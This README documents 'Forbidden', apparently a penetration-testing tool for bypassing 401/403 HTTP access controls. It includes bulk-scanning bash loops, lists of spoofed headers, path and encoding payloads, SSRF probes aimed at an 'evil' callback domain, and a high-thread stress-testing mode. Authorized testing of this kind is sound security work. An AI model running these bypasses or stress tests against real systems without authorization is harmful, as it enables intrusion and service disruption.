# Forbidden

Bypass 4xx HTTP response status codes and more. Based on `PycURL`.

Script uses multithreading and is based on brute forcing, so it might have some false positive results. Script has colored output.

Results will be sorted by HTTP response status code ascending, content length descending, and ID ascending.

To manually filter out false positive results, for each unique content length, run the provided `cURL` command and check the response. If it does not result in bypass, just ignore all the results with the same content length.

| Test | Scope |
| --- | --- |
| HTTP methods - w/ both HTTP and HTTPS requests, and 'Content-Length: 0' header | methods |
| Cross-site tracing (XST) with HTTP TRACE and TRACK methods | methods |
| \[Text\] file upload with HTTP PUT method | methods |
| HTTP method overrides - w/ HTTP headers, and URL parameters | method-overrides |
| URL scheme overrides | scheme-overrides |
| Port overrides | port-overrides |
| Information disclosure with 'Accept' header | headers |
| HTTP headers | headers |
| URL overrides - w/ accessible path, and double 'Host' header | headers |
| URL path bypasses | paths |
| URL transformations and encodings | encodings |
| Basic and bearer authentication - w/ null session, and invalid tokens | auths |
| Open redirects and server-side request forgery (SSRF) - HTTP headers only | redirects |
| Broken URL parsers | parsers |

---

Check the stress testing script [here](https://github.com/ivan-sincek/forbidden/blob/main/src/stresser.py). Inspired by this [write-up](https://amineaboud.medium.com/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125).

Extend the scripts to your liking.

Good sources of HTTP headers:

* [Common HTTP Response Headers](https://webtechsurvey.com/common-response-headers)

Tested on Kali Linux v2022.2 (64-bit).

Made for educational purposes. I hope it will help!

---

**Remarks:**

* some websites might require a valid/specific [user agent](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/User-Agents/UserAgents.fuzz.txt) HTTP request header,
* some web proxies might modify some HTTP requests (e.g. the ones in the `encoding` scope),
* beware of `rate limiting` and other similar protections, take some time before you run the script again on the same domain,
* connection timeout is set to `90` seconds, and response timeout is set to `180` seconds,
* average runtime for all tests on a single thread is `12` minutes; optimal no. of threads is `5`,
* `length` attribute in results includes only HTTP response body length,
* cross-site tracing (XST) is `no more` considered to be a vulnerability,
* cURL commands to test double `Host` header don't work properly because cURL doesn't allow that - I had to send HTTP requests using `requests` library.

**High priority plans:**

* more path bypasses,
* add option to wait/sleep between requests on a single thread,
* scope tests to only allowed HTTP methods (fetched with HTTP OPTIONS method),
* do not ignore URL parameters and fragments,
* add option to ignore multiple texts.

**Low priority plans:**

* Log4j support,
* table output to make results more readable and take less space,
* add option to test custom HTTP header-value pairs for a list of domains/subdomains.

## Table of Contents

* [How to Run](#how-to-run)
* [Automation](#automation)
* [HTTP Methods](#http-methods)
* [HTTP Headers](#http-headers)
* [URL Paths](#url-paths)
* [Results Format](#results-format)
* [Usage](#usage)
	* [forbidden.py](#forbiddenpy)
	* [stresser.py](#stresserpy)

## How to Run

Open your preferred console from [/src/](https://github.com/ivan-sincek/forbidden/tree/main/src) and run the commands shown below.

Install required tools:

```fundamental
apt-get install -y curl
```

Install required packages:

```fundamental
pip3 install -r requirements.txt
```

Run the script:

```fundamental
python3 forbidden.py
```

## Automation

Bypass `403 Forbidden` HTTP response status code:

```bash
count=0; for subdomain in $(cat subdomains_403.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; python3 forbidden.py -u "${subdomain}" -t methods,method-overrides,scheme-overrides,port-overrides,headers,paths,encodings -f GET -l base,path -o "forbidden_403_results_${count}.json"; done
```

Bypass `403 Forbidden` HTTP response status code with stress testing:

```bash
count=0; for subdomain in $(cat subdomains_403.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; python3 stresser.py -u "${subdomain}" -dir "stresser_403_results_${count}" -r 1000 -th 200 -f GET -l base -o "stresser_403_results_${count}.json"; done
```

Bypass `401 Unauthorized` HTTP response status code:

```bash
count=0; for subdomain in $(cat subdomains_401.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; python3 forbidden.py -u "${subdomain}" -t auths -f GET -l base -o "forbidden_401_results_${count}.json"; done
```

Scan for open redirects and server-side request forgery (SSRF):

```bash
count=0; for subdomain in $(cat subdomains_live_long.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; python3 forbidden.py -u "${subdomain}" -t redirects -f GET -l base -e xyz.interact.sh -o "forbidden_redirect_results_${count}.json"; done
```

Scan for broken URL parsers:

```bash
count=0; for subdomain in $(cat subdomains_live_long.txt); do count=$((count+1)); echo "#${count} | ${subdomain}"; python3 forbidden.py -u "${subdomain}" -t parsers -f GET -l base -e xyz.interact.sh -o "forbidden_parser_results_${count}.json"; done
```

# HTTP Methods

```fundamental
ACL
ARBITRARY
BASELINE-CONTROL
BIND
CHECKIN
CHECKOUT
CONNECT
COPY
GET
HEAD
INDEX
LABEL
LINK
LOCK
MERGE
MKACTIVITY
MKCALENDAR
MKCOL
MKREDIRECTREF
MKWORKSPACE
MOVE
OPTIONS
ORDERPATCH
PATCH
POST
PRI
PROPFIND
PROPPATCH
PUT
REBIND
REPORT
SEARCH
SHOWMETHOD
SPACEJUMP
TEXTSEARCH
TRACE
TRACK
UNBIND
UNCHECKOUT
UNLINK
UNLOCK
UPDATE
UPDATEREDIRECTREF
VERSION-CONTROL
```

# HTTP Headers

Method overrides:

```fundamental
X-HTTP-Method
X-HTTP-Method-Override
X-Method-Override
```

Scheme overrides:

```fundamental
Front-End-HTTPS
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Forwarded-SSL
X-URL-Scheme
X-URLSCHEME
```

Port overrides:

```fundamental
X-Forwarded-Port
```

Default:

```fundamental
Base-URL
CF-Connecting-IP
Client-IP
Cluster-Client-IP
Connection
Contact
Destination
Forwarded
Forwarded-For
Forwarded-For-IP
From
Host
Origin
Profile
Proxy
Redirect
Referer
Request-URI
Stuff
True-Client-IP
URI
URL
X-Client-IP
X-Custom-IP-Authorization
X-Forward
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Server
X-Forward-For
X-Host
X-Host-Override
X-HTTP-DestinationURL
X-HTTP-Host-Override
X-Originally-Forwarded-For
X-Original-Remote-Addr
X-Original-URL
X-Originating-IP
X-Override-URL
X-Proxy-URL
X-ProxyUser-IP
X-Real-IP
X-Referer
X-Remote-Addr
X-Remote-IP
X-Rewrite-URL
X-Server-IP
X-Wap-Profile
```

# URL Paths

Inject at the beginning, end, and both beginning and end of URL path. All combinations.

```fundamental
/
//
%09
%20
%23
%2e
*
.
..
;
.;
..;
;foo=bar;
```

Inject at the end of URL path.

```fundamental
#
##
##random
*
**
**random
.
..
..random
?
??
??random
~
~~
~~random
```

Inject at the end of URL path, but only if URL path does not end with '/'.

```fundamental
.asp
.aspx
.esp
.html
.jhtml
.json
.jsp
.jspa
.jspx
.php
.sht
.shtml
.xhtml
```

## Results Format

```json
[
   {
      "id":"559-HEADERS-2",
      "url":"https://example.com:443/admin",
      "method":"GET",
      "headers":[
         "Host: 127.0.0.1"
      ],
      "body":null,
      "agent":"Forbidden/7.8",
      "command":"curl --connect-timeout 90 -m 180 -iskL --max-redirs 10 --path-as-is -H 'Host: 127.0.0.1' -H 'User-Agent: Forbidden/7.8' -X 'GET' 'https://example.com:443/admin'",
      "code":200,
      "length":255408
   },
   {
      "id":"560-HEADERS-2",
      "url":"https://example.com:443/admin",
      "method":"GET",
      "headers":[
         "Host: 127.0.0.1:443"
      ],
      "body":null,
      "agent":"Forbidden/7.8",
      "command":"curl --connect-timeout 90 -m 180 -iskL --max-redirs 10 --path-as-is -H 'Host: 127.0.0.1:443' -H 'User-Agent: Forbidden/7.8' -X 'GET' 'https://example.com:443/admin'",
      "code":200,
      "length":255408
   }
]
```

## Usage

### forbidden.py

```fundamental
Forbidden v7.8 ( github.com/ivan-sincek/forbidden )

Usage:   python3 forbidden.py -u url                       -t tests [-f force] [-v values    ] [-p path            ] [-o out         ]
Example: python3 forbidden.py -u https://example.com/admin -t all   [-f GET  ] [-v values.txt] [-p /home/index.html] [-o results.json]

DESCRIPTION
    Bypass 4xx HTTP response status codes and more
URL
    Inaccessible or forbidden URL
    Parameters and fragments are ignored
    -u <url> - https://example.com/admin | etc.
TESTS
    Tests to run
    Use comma separated values
    -t <tests> - methods | [method|scheme|port]-overrides | headers | paths | encodings | auths | redirects | parsers | all
FORCE
    Force an HTTP method for nonspecific test cases
    -f <force> - GET | POST | CUSTOM | etc.
VALUES
    File with additional HTTP header values such as internal IPs, etc.
    Spacing will be stripped, empty lines ignored, and duplicates removed
    Scope: headers
    -v <values> - values.txt | etc.
PATH
    Accessible URL path to test URL overrides
    Scope: headers
    Default: /robots.txt
    -p <path> - /home/index.html | /README.txt | etc.
EVIL
    Specify (strictly) evil domain name with no port to test URL overrides
    Scope: headers | redirects
    Default: github.com
    -e <evil> - xyz.interact.sh | xyz.burpcollaborator.net | etc.
IGNORE
    Filter out 200 OK false positive results by text
    Spacing will be stripped
    -i <ignore> - Forbidden | "Access Denied" | etc.
LENGTHS
    Filter out 200 OK false positive results by content lengths
    Specify 'base' to ignore content length of base HTTP response
    Specify 'path' to ignore content length of accessible URL response
    Use comma separated values
    -l <lengths> - 12 | base | path | etc.
THREADS
    Number of parallel threads to run
    More threads make it quicker but can give worse results
    Heavily depends on network bandwidth and server capacity
    Default: 5
    -th <threads> - 200 | etc.
AGENT
    User agent to use
    Default: Forbidden/7.8
    -a <agent> - curl/3.30.1 | etc.
PROXY
    Web proxy to use
    -x <proxy> - 127.0.0.1:8080 | etc.
OUT
    Output file
    -o <out> - results.json | etc.
```

### stresser.py

```fundamental
Stresser v2.8 ( github.com/ivan-sincek/forbidden )

Usage:   python3 stresser.py -u url                        -dir directory -r repeat -th threads [-f force] [-o out         ]
Example: python3 stresser.py -u https://example.com/secret -dir results   -r 1000   -th 200     [-f GET  ] [-o results.json]

DESCRIPTION
    Bypass 4xx HTTP response status codes with stress testing
URL
    Inaccessible or forbidden URL
    Parameters and fragments are ignored
    -u <url> - https://example.com/secret | etc.
DIRECTORY
    Output directory
    All valid and unique HTTP responses will be saved in this directory
    -dir <directory> - results | etc.
REPEAT
    Number of HTTP requests to send for each test case
    -r <repeat> - 1000 | etc.
THREADS
    Number of parallel threads to run
    -th <threads> - 200 | etc.
FORCE
    Force an HTTP method for nonspecific test cases
    -f <force> - GET | POST | CUSTOM | etc.
IGNORE
    Filter out 200 OK false positive results by text
    Spacing will be stripped
    -i <ignore> - Forbidden | "Access Denied" | etc.
LENGTHS
    Filter out 200 OK false positive results by content lengths
    Specify 'base' to ignore content length of base HTTP response
    Use comma separated values
    -l <lengths> - 12 | base | etc.
AGENT
    User agent to use
    Default: Stresser/2.8
    -a <agent> - curl/3.30.1 | etc.
PROXY
    Web proxy to use
    -x <proxy> - 127.0.0.1:8080 | etc.
OUT
    Output file
    -o <out> - results.json | etc.
```
